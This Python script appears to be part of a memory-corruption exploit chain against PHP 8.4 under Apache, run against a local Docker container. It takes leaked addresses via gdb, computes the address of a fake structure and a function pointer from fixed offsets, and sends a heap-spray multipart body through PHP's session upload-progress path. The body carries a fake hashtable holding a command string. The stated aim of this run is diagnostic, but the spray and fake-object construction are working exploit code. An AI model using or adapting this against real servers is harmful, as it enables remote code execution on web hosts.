#!/usr/bin/env python3
"""Catch zval_ptr_dtor(&PS(http_session_vars)) on the A2 child during a
harmless (rc=2) B2 and report the exact zval/reference state at session-init.
"""
import json, os, subprocess, sys, time

D = "/tmp/opencode/research/modphp_84_matrix_20261023T074116Z"
sys.path.insert(0, os.path.join(D, "scripts"))
sys.path.insert(0, "/tmp/opencode/research/9bie_update_20261022T115026Z/code/repo/pure")
import chain84 as C
from fake_ref_b import make_spray, make_name
from mk_ht import build as build_ht

CNAME = "m109-d8424pkg"
PORT = 18740
LOG = "/var/log/apache2/p2s-access.log"
BOUND = b"C" * 10


def sh(cmd, **kw):
    return subprocess.run(cmd, capture_output=True, text=True, **kw)


def state(pid):
    r = sh(["docker", "exec", CNAME, "gdb", "-batch", "-p", str(pid), "-x", "/tmp/deb_state.gdb"])
    for line in r.stdout.splitlines():
        if line.startswith("DEBSTATE"):
            return dict(kv.split("=", 1) for kv in line.split()[1:])
    return {"err": (r.stdout + r.stderr).strip()[-200:]}


def log_lines():
    return sh(["docker", "exec", CNAME, "sh", "-c", "cat %s 2>/dev/null" % LOG]).stdout.splitlines()


def diag_b2(S, zif, cmd, rc=2, n1=500, n2=495, vl=384):
    spray = make_spray(vl, S, rc, 0x0107, 8, 32)
    ht = build_ht(S, zif, cmd.encode(), 384)

    def part(name, value):
        return (b"--" + BOUND + b"\r\nContent-Disposition: form-data; name=\"" +
                name + b"\"\r\n\r\n" + value + b"\r\n")
    body = bytearray()
    for i in range(n1):
        body += part(make_name(b"s", i, 10), spray)
    body += part(b"ht", ht)
    body += part(b"PHPSESSID", b"a" * 32)
    body += part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k0")
    for i in range(n2):
        body += part(make_name(b"t", i, 10), spray)
    body += b"--" + BOUND + b"--\r\n"
    return bytes(body)


def main():
    outdir = os.path.join(D, "out/debbp")
    os.makedirs(outdir, exist_ok=True)
    rec = {}
    print("== restart", flush=True)
    sh(["docker", "restart", CNAME])
    time.sleep(2.0)

    n = len(log_lines())
    pr = C.send_chunked(PORT, "/index.php?q0000000=v", os.path.join(D, "bodies/a1.bin"),
                        os.path.join(outdir, "a1.resp"))
    pr.wait(timeout=300)
    a1 = open(os.path.join(outdir, "a1.resp"), "rb").read()
    time.sleep(0.2)
    print("A1", a1.split(b"\r\n", 1)[0], log_lines()[n:], flush=True)

    n = len(log_lines())
    procs = []
    for i in range(5):
        s = os.path.join(outdir, "b1_%d.resp" % i)
        procs.append(C.send_chunked(PORT, "/index.php", os.path.join(D, "bodies/b1.bin"), s))
    for p in procs:
        try:
            p.wait(timeout=300)
        except subprocess.TimeoutExpired:
            p.kill()
    time.sleep(0.3)
    print("B1", log_lines()[n:], flush=True)

    n = len(log_lines())
    r = C.send_plain(PORT, "/index.php", C.a2_body())
    time.sleep(0.3)
    a2log = log_lines()[n:]
    a2pid = int(a2log[-1].split()[0]) if a2log else None
    st = state(a2pid) if a2pid else None
    print("A2", r.split(b"\r\n", 1)[0], a2log, st, flush=True)
    rec["a2"] = {"pid": a2pid, "state": st, "log": a2log}
    if not st or st.get("hsv") in (None, "0x0"):
        print("no hsv", flush=True)
        return 3
    main = int(st["main"], 16)
    lib = int(st["lib"], 16)
    hsv = int(st["hsv"], 16)
    S = main + 0xF8398
    zif = lib + 0x24CDD0
    rec.update({"main": hex(main), "lib": hex(lib), "hsv": hex(hsv), "S": hex(S), "zif": hex(zif)})

    # install breakpoint script
    sh(["docker", "cp", os.path.join(D, "scripts/deb_hsv_bp.gdb"), CNAME + ":/tmp/deb_hsv_bp.gdb"])
    glog = os.path.join(outdir, "gdb_bp.txt")
    gp = subprocess.Popen(["docker", "exec", CNAME, "gdb", "-batch", "-p", str(a2pid),
                           "-x", "/tmp/deb_hsv_bp.gdb"],
                          stdout=open(glog, "wb"), stderr=subprocess.STDOUT)
    time.sleep(1.5)
    print("gdb attached to", a2pid, "poll", gp.poll(), flush=True)

    body = diag_b2(S, zif, "DBP_%x" % (int(time.time()) & 0xFFFFF), rc=2)
    sent = []
    hit = False
    for k in range(8):
        n = len(log_lines())
        resp = C.send_plain(PORT, "/index.php", body, timeout=300)
        time.sleep(0.25)
        lg = log_lines()[n:]
        pid = int(lg[-1].split()[0]) if lg else None
        sent.append({"k": k, "pid": pid, "status": resp.split(b"\r\n", 1)[0].decode("latin1"), "log": lg})
        print("B2 try", k, "pid", pid, resp.split(b"\r\n", 1)[0], flush=True)
        if pid == a2pid:
            hit = True
            break
    for i in range(40):
        if gp.poll() is not None:
            break
        time.sleep(0.25)
    alive = gp.poll() is None
    if alive:
        gp.kill()
        gp.wait()
    rec["sent"] = sent
    rec["hit"] = hit
    rec["gdb_exited"] = not alive
    out = open(glog, "rb").read().decode("latin1", "replace")
    rec["gdb_out"] = out[-4000:]
    print("=== GDB OUTPUT (tail) ===", flush=True)
    print(out[-3000:], flush=True)
    json.dump(rec, open(os.path.join(outdir, "bp.json"), "w"), indent=1)
    print("saved", os.path.join(outdir, "bp.json"), flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
